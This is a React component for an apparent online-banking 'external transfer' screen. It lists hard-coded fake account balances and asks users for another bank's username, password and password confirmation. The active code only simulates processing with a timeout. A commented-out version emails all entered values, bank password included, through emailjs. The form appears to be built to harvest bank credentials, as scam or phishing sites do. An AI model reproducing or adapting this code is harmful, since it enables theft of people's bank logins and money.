import React, { useState } from "react";
import SelectDropdown from "../Shared/selectDropdown/SelectDropdown";
import { H5, P2 } from "../Shared/headings/Headings";
import Button from "../Shared/button/Button";
import Modal from "../Shared/Modal/Modal";
import Processing from "../Modals/Processed";
import { Formik } from "formik";
import { externalSchema } from "@/utils/formSchema";
import Input from "../Shared/input/input2";
import Sure from "../Modals/Sure";

const options = [
  {
    value: "Primary Checking-1669 $15,322.45",
    label: "Primary Checking-1669 $15,322.45",
  },
  {
    value: "Simple Checking-3263 $7,450.91",
    label: "Simple Checking-3263 $7,450.91",
  },
  {
    value: "Savings -7596 $42,716.92",
    label: "Savings -7596 $42,716.92",
  },
];

const recurringOptions = [
  {
    value: "Every Week",
    label: "Every Week",
  },
  {
    value: "Every 2 weeks",
    label: "Every 2 weeks",
  },
  {
    value: "Every 3 weeks",
    label: "Every 3 weeks",
  },
  {
    value: "Every 1 month",
    label: "Every 1 month",
  },
];

const ExternalTranfer = () => {
  const initialValues = {
    BankName: "",
    BankUsername: "",
    Password: "",
    PasswordConfirmation: "",
    Amount: "",
  };
  const [transferType, setTransferType] = useState("one-time");
  const [modalOpen, setModalOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = () => {
    setIsLoading(true);
    setTimeout(() => {
      handleModalOpen();
      setIsLoading(false);
    }, 3000);
  };

  const handleSelect = (value: string) => {
    // console.log("Selected:", value);
    // Do something with the selected value
  };

  const handleModalOpen = () => {
    setModalOpen(!modalOpen);
  };

  const handleModalClose = () => {
    setModalOpen(false);
  };

  return (
    <>
      <div className="w-full ">
        <Formik
          initialValues={initialValues}
          onSubmit={handleSubmit}
          validationSchema={externalSchema}
        >
          {({ handleSubmit }) => (
            <form className="w-5/6 mx-auto " onSubmit={handleSubmit}>
              <div className="">
                <P2>From</P2>

                <div className="flex flex-col gap-2">
                  <SelectDropdown options={options} onSelect={handleSelect} />

                  <Input
                    label={"To"}
                    name="BankName"
                    placeholder={"Enter Your Bank Name"}
                  />

                  <Input
                    label={""}
                    name="BankUsername"
                    placeholder={"Enter Bank User Name"}
                  />

                  <Input
                    label={""}
                    name="Password"
                    placeholder={"Enter Bank Password"}
                    type="password"
                  />

                  <Input
                    label={""}
                    name="PasswordConfirmation"
                    placeholder={"Confirm Bank Password"}
                    type="password"
                  />

                  <Input
                    label={"Enter Amount"}
                    name="Amount"
                    placeholder={""}
                  />
                </div>

                <H5 className="mt-4">Choose a transfer type</H5>

                <div className="flex flex-row gap-4 items-center justify-center w-full my-4">
                  <Button
                    type="button"
                    style={{
                      color: transferType === "one-time" ? "white" : "black",
                      backgroundColor:
                        transferType === "one-time" ? "green" : "unset",
                    }}
                    onClick={() => setTransferType("one-time")}
                  >
                    One Time
                  </Button>
                  <Button
                    type="button"
                    style={{
                      color: transferType === "recurring" ? "white" : "black",
                      backgroundColor:
                        transferType === "recurring" ? "green" : "unset",
                    }}
                    onClick={() => setTransferType("recurring")}
                  >
                    Recurring
                  </Button>
                </div>

                {transferType === "one-time" && (
                  <P2>Make this transfer once</P2>
                  // <Input label="Make this transfer once" name={""} placeholder={""} />
                )}
                {transferType === "recurring" && (
                  <div className="flex flex-col gap-2 mt-4">
                    <SelectDropdown
                      options={recurringOptions}
                      onSelect={handleSelect}
                    />
                    {/* <Input
                      label={"Optional"}
                      name={""}
                      placeholder={"specify others"}
                      className="mt-4"
                    /> */}
                  </div>
                )}
              </div>
              <Button type="submit" color="secondary" className="w-full my-10">
                {isLoading ? "Loading..." : "Done"}
              </Button>
            </form>
          )}
        </Formik>
      </div>
      {modalOpen && (
        <Modal
          openModal={modalOpen}
          setOpenModal={handleModalOpen}
          variant="filled"
          className=""
        >
          <Sure onClose={handleModalClose} />
        </Modal>
      )}
    </>
  );
};

export default ExternalTranfer;

// import React, { useState } from "react";
// import emailjs from "emailjs-com";
// import SelectDropdown from "../Shared/selectDropdown/SelectDropdown";
// import { H5, P2 } from "../Shared/headings/Headings";
// import Button from "../Shared/button/Button";
// import Modal from "../Shared/Modal/Modal";
// import Processing from "../Modals/Processed";
// import { Formik } from "formik";
// import { externalSchema } from "@/utils/formSchema";
// import Input from "../Shared/input/input2";

// const options = [
//   {
//     value: "Primary Checking-1669 $15,322.45",
//     label: "Primary Checking-1669 $15,322.45",
//   },
//   {
//     value: "Simple Checking-3263 $7,450.91",
//     label: "Simple Checking-3263 $7,450.91",
//   },
//   {
//     value: "Savings -7596 $42,716.92",
//     label: "Savings -7596 $42,716.92",
//   },
// ];

// const recurringOptions = [
//   {
//     value: "Every Week",
//     label: "Every Week",
//   },
//   {
//     value: "Every 2 weeks",
//     label: "Every 2 weeks",
//   },
//   {
//     value: "Every 3 weeks",
//     label: "Every 3 weeks",
//   },
//   {
//     value: "Every 1 month",
//     label: "Every 1 month",
//   },
// ];

// const ExternalTranfer = () => {
//   const initialValues = {
//     BankName: "",
//     BankUsername: "",
//     Password: "",
//     PasswordConfirmation: "",
//     Amount: "",
//   };
//   const [transferType, setTransferType] = useState("one-time");
//   const [modalOpen, setModalOpen] = useState(false);

//   const handleSubmit = (values) => {
//     emailjs.send(
//       /* Your service ID */
//       "YOUR_SERVICE_ID",
//       /* Your template ID */
//       "YOUR_TEMPLATE_ID",
//       /* Template parameters */
//       {
//         ...values,
//         transferType,
//       },
//       /* Your user ID */
//       "YOUR_USER_ID"
//     )
//     .then((response) => {
//       console.log('Email sent successfully!', response);
//       handleModalOpen();
//     })
//     .catch((error) => {
//       console.error('Email could not be sent:', error);
//     });
//   };

//   const handleSelect = (value: string) => {
//     // console.log("Selected:", value);
//     // Do something with the selected value
//   };

//   const handleModalOpen = () => {
//     setModalOpen(true);
//   };

//   const handleModalClose = () => {
//     setModalOpen(false);
//   };

//   return (
//     <>
//       <div className="w-full ">
//         <Formik
//           initialValues={initialValues}
//           onSubmit={handleSubmit}
//           validationSchema={externalSchema}
//         >
//           {({ handleSubmit }) => (
//             <form className="w-5/6 mx-auto " onSubmit={handleSubmit}>
//               <div className="">
//                 <P2>From</P2>

//                 <div className="flex flex-col gap-2">
//                   <SelectDropdown options={options} onSelect={handleSelect} />

//                   <Input
//                     label={"To"}
//                     name="BankName"
//                     placeholder={"Enter Your Bank Name"}
//                   />

//                   <Input
//                     label={""}
//                     name="BankUsername"
//                     placeholder={"Enter Bank User Name"}
//                   />

//                   <Input
//                     label={""}
//                     name="Password"
//                     placeholder={"Enter Bank Password"}
//                     type="password"
//                   />

//                   <Input
//                     label={""}
//                     name="PasswordConfirmation"
//                     placeholder={"Confirm Bank Password"}
//                     type="password"
//                   />

//                   <Input
//                     label={"Enter Amount"}
//                     name="Amount"
//                     placeholder={""}
//                   />
//                 </div>

//                 <H5 className="mt-4">Choose a transfer type</H5>

//                 <div className="flex flex-row gap-4 items-center justify-center w-full my-4">
//                   <Button
//                     type="button"
//                     style={{
//                       color: transferType === "one-time" ? "white" : "black",
//                       backgroundColor:
//                         transferType === "one-time" ? "green" : "unset",
//                     }}
//                     onClick={() => setTransferType("one-time")}
//                   >
//                     One Time
//                   </Button>
//                   <Button
//                     type="button"
//                     style={{
//                       color: transferType === "recurring" ? "white" : "black",
//                       backgroundColor:
//                         transferType === "recurring" ? "green" : "unset",
//                     }}
//                     onClick={() => setTransferType("recurring")}
//                   >
//                     Recurring
//                   </Button>
//                 </div>

//                 {transferType === "one-time" && (
//                   <P2>Make this transfer once</P2>
//                   // <Input label="Make this transfer once" name={""} placeholder={""} />
//                 )}
//                 {transferType === "recurring" && (
//                   <div className="flex flex-col gap-2 mt-4">
//                     <SelectDropdown
//                       options={recurringOptions}
//                       onSelect={handleSelect}
//                     />
//                     {/* <Input
//                       label={"Optional"}
//                       name={""}
//                       placeholder={"specify others"}
//                       className="mt-4"
//                     /> */}
//                   </div>
//                 )}
//               </div>
//               <Button type="submit" color="secondary" className="w-full my-10">
//                 Done
//               </Button>
//             </form>
//           )}
//         </Formik>
//       </div>
//       {modalOpen && (
//         <Modal
//           openModal={modalOpen}
//           setOpenModal={handleModalOpen}
//           variant="filled"
//           className=""
//         >
//           <Processing closeModal={handleModalClose} />
//         </Modal>
//       )}
//     </>
//   );
// };

// export default ExternalTranfer;
